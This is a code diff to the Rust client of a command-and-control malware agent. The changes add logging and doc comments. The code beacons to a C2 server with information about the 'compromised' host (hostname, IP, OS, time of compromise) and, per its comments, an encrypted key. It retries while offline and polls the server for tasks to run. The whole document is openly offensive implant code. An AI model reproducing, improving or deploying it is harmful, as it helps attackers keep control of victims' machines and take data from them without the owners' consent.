@@ -9,12 +9,16 @@ use local_ip_address::local_ip;
 use crate::communication::codec::JsonCodec;
 use crate::communication::message::{AgentMessage, ServerMessage};
 use crate::post::commands::AgentCommand;
+use crate::utils::logger::Logger;
 
 
-/// Send message modular function
+/// Attempts to establish a TCP connection to the specified address asynchronously,
+/// returning a `TcpStream` on success. If the connection fails, returns an error
+/// with a formatted message describing the failure reason.
 async fn send_message(addr: &str, message: AgentMessage, timeout_secs: u64) -> Result<Option<ServerMessage>, String> {
     println!("[*] Connecting to {}", addr);
 
+    
     let stream = TcpStream::connect(addr).await.map_err(|e| format!("Connect failed: {}", e))?;
     let (read_half, write_half) = stream.into_split();
     let mut framed_rx = FramedRead::new(read_half, JsonCodec::<ServerMessage>::new());
@@ -36,16 +40,18 @@ async fn send_message(addr: &str, message: AgentMessage, timeout_secs: u64) -> R
 
 /// Beacon C2 and send victim info and encrypted key to C2
 /// if C2 unavailable, operate offline until can connect -> send in random intervals until connected
-pub async fn initial_beacon(addr: &str, retries: u64, timeout: u64) -> (u64, String) {
+pub async fn initial_beacon(addr: &str, retries: u64, timeout: u64, logger: &Logger) -> (u64, String) {
     let beacon = match get_info().await {
         Ok(beacon) => beacon,
         Err(e) => {
-            eprintln!("[-] Failed to get host info: {:?}", e);
+            logger.error(&format!("[-] Failed to get host info: {:?}", e));
+            // eprintln!("[-] Failed to get host info: {:?}", e);
             return (0, "NONE".to_string());
         }
     };
 
     for attempt in 1..=retries {
+        // logger.log(&format!("[*] Attempting beacon (attempt {}/{})", attempt, retries));
         println!("[*] Attempting beacon (attempt {}/{})", attempt, retries);
         match send_message(addr, beacon.clone(), timeout).await {
             Ok(Some(ServerMessage::Ack {
@@ -53,21 +59,25 @@ pub async fn initial_beacon(addr: &str, retries: u64, timeout: u64) -> (u64, Str
                 status,
                 session_id,
             })) => {
-                println!("[*] Received Ack from server (status: {})", status);
+                logger.log(&format!("[*] Received Ack from server (status: {})", status));
+                // println!("[*] Received Ack from server (status: {})", status);
                 return (agent_id, session_id);
             }
             Ok(Some(msg)) => {
-                eprintln!("[!] Unexpected message: {:?}", msg);
+                logger.error(&format!("[!] Unexpected message: {:?}", msg));
+                // eprintln!("[!] Unexpected message: {:?}", msg);
                 return (0, "NONE".to_string());
             }
             Err(e) => {
-                eprintln!("[!] Beacon attempt failed: {}", e);
+                logger.error(&format!("[!] Beacon attempt failed: {}", e));
+                // eprintln!("[!] Beacon attempt failed: {}", e);
             }
             _ => {}
         }
     }
 
-    eprintln!("[!] No Ack received after {} attempts. Operating offline.", retries);
+    logger.log(&format!("[!] No Ack received after {} attempts. Operating offline.", retries));
+    // eprintln!("[!] No Ack received after {} attempts. Operating offline.", retries);
     (0, "NONE".to_string())
 }
 
@@ -76,7 +86,8 @@ pub async fn heartbeat(
     agent_id: u64, 
     session_id: &str, 
     timeout_secs: u64, 
-    result: Option<Vec<String>>) -> Option<Vec<AgentCommand>> {
+    result: Option<Vec<String>>,
+    logger: &Logger) -> Option<Vec<AgentCommand>> {
     let heartbeat = AgentMessage::Heartbeat { 
         agent_id, 
         session_id: session_id.to_string(), 
@@ -88,7 +99,8 @@ pub async fn heartbeat(
             agent_id: _, 
             session_id: _ 
         })) => {
-            println!("[*] Received NOOP from C2");
+            logger.log("[*] Received NOOP from C2");
+            //println!("[*] Received NOOP from C2");
             return None
         }
         Ok(Some(ServerMessage::Task { 
@@ -96,24 +108,40 @@ pub async fn heartbeat(
             session_id: _, 
             command 
         })) => {
-            println!("[*] Received tasks from C2");
+            logger.log("[*] Received tasks from C2");
+            //println!("[*] Received tasks from C2");
             return Some(command)
         }
         Ok(Some(ServerMessage::Disconnect { 
             agent_id:_, 
             session_id:_ 
         })) => {
-            println!("[*] Received disconnect from C2");
+            logger.log("[*] Received disconnect from C2");
+            //println!("[*] Received disconnect from C2");
             return None
         }
-        Ok(Some(msg)) => {eprintln!("[!] Unexpected message: {:?}", msg);}
-        Err(e) => {eprintln!("[!] Beacon attempt failed: {}", e)}
+        Ok(Some(msg)) => {
+            logger.error(&format!("[!] Unexpected message: {:?}", msg));
+            //eprintln!("[!] Unexpected message: {:?}", msg);
+        }
+        Err(e) => {
+            logger.error(&format!("[!] Beacon attempt failed: {}", e));
+            //eprintln!("[!] Beacon attempt failed: {}", e)
+        }
         _ => {}
     }
 
     return None
 }
 
+/// Constructs an `AgentMessage::Beacon` variant containing information about the compromised system,
+    /// including the hostname, public IP address, operating system, and the current timestamp in RFC 3339 format.
+    /// 
+    /// # Fields
+    /// - `hostname`: The system's hostname as a `String`.
+    /// - `ip`: The public IP address of the system.
+    /// - `os`: The operating system as a `String`.
+    /// - `time_compromised`: The timestamp when the system was compromised, formatted as an RFC 3339 string.
 pub async fn get_info() -> Result<AgentMessage, Box<dyn std::error::Error>> {
     let hostname = gethostname();
     let local_ip = local_ip()?;
@@ -129,8 +157,6 @@ pub async fn get_info() -> Result<AgentMessage, Box<dyn std::error::Error>> {
         os: os.to_string(), 
         time_compromised: chrono::Local::now().to_rfc3339() 
     };
-
-
 
     Ok(message)
 }
